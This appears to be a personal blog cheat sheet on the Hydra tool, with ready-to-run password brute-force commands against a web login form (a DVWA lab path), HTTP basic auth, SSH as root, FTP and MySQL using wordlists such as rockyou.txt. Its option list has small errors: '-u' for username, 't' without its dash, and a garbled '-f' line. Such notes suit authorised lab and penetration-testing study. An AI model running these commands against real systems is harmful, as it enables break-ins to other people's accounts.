---
title: Hydra
date: 2022-08-03 21:55:00 +0800
categories: [Tools]
tags: [Hydra, SSH, FTP, MySQL, Web]
pin: false
---

![hydra-pass](/assets/img/posts/hydra-contrasenas.webp)

## Web forms

To launch password attacks in forms using `http-post-form` and injecting the variables like `^USER^`. The data in the request can be obtained using Chrome dev tools or `Burpsuite`.

```console
hydra -l admin -P /usr/share/jonh/password.lst 10.0.2.6 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&login=Login:Login failed" -f
```

The options are:

- `-u` username
- `-L` user list
- `-p` password
- `-P` passwordList
- `-f` exit at the first successful result server, where to attack service
- `t` number of threads to run in parallel
- `http-post-form` service.

Another example with `http-get`

```console
hydra -l admin -P pass.txt $TARGET http-get /webdav
```

## SSH

We use the `ssh` service.

```console
hydra -l root -P /usr/share/wordlists/rockyou.txt.gz $TARGET ssh
```

## FTP

```console
hydra -t 4 -l Mike -P /usr/share/wordlists/rockyou.txt -vV $TARGET ftp
```

## MySQL

```console
hydra -t 4 -l root -P /usr/share/wordlists/rockyou.txt $TARGET mysql
```
